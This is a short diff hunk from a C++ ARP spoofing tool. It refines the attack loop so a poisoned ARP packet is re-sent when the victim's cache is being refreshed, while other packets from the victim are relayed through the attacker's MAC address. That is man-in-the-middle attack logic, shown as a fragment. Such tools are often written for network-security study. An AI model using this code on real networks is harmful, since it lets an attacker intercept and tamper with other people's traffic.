@@ -101,11 +101,11 @@ void arp_spoofing::ExecuteArpSpoofing() {
         if (res == 0) continue;
         if (res == -1 || res == -2) return;
 
-        if(arpcd::IsBroadcastArp(packet, Sender->GetMacAddress())){
+        if(arpcd::IsBroadcastArp(packet, Sender->GetMacAddress()) &&
+                arpcd::IsCacheUpdate(packet, Target->GetIpAddress(), Target->GetMacAddress())){
             pcap_sendpacket(handle, attack_packet, 60);
         }
-
-        if (pcktcd::IsSenderPacket(packet, Sender->GetMacAddress(), Attacker->GetMacAddress())){
+        else if (pcktcd::IsSenderPacket(packet, Sender->GetMacAddress(), Attacker->GetMacAddress())){
             int packet_size = (int)header->len;
             u_char* relay_packet = new u_char[packet_size];
             u_char* attacker_mac = Attacker->GetMacAddress();
